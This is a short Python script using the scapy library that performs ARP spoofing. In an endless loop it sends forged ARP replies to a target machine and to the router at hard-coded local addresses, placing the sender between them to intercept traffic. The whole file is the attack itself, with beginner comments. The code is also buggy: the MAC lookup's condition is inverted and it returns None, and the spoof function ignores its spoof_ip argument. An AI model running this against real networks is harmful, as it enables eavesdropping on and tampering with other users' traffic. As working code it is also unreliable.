#!usr/bin/env python3

import time

import scapy.all as scapy


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #A packet that asks a specific IP 
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff") #This will create a ether object and store an instance in variable boradcast 
    arp_request_boradcast = broadcast/arp_request #appending our 2 packtes using / 
    answered_list = scapy.srp(arp_request_boradcast, timeout=1, verbose = False)[0] #sr is function of sending & receiving 
    #while srp actually allows custom ether
    if answered_list == "":
        return print(answered_list[0][1].hwsrc)


def spoof(tartget_ip, spoof_ip): #spoof_ip = IP we're pretending to be 
    tartget_mac = get_mac(tartget_ip)
    packet = scapy.ARP(op = 2,pdst=tartget_ip, hwdst= tartget_mac, psrc= "192.168.0.1") 
    #By default op is 1(arp request), setting it to 2 will create an ARP response 
    scapy.send(packet)
#print(packet.show())
#print(packet.summary()

sent_packets_count = 0 #Integer  
while True:
    spoof("192.168.0.103", "192.168.0.1") #Telling the target_comp that we're the router 
    spoof("192.168.0.1", "192.168.0.104") #Telling the router that thi is the target_computer 
    sent_packets_count = sent_packets_count + 2 
    print("Sent packet Count: " + str(sent_packets_count)) #String and num cannot be concatenated 
    time.sleep(2)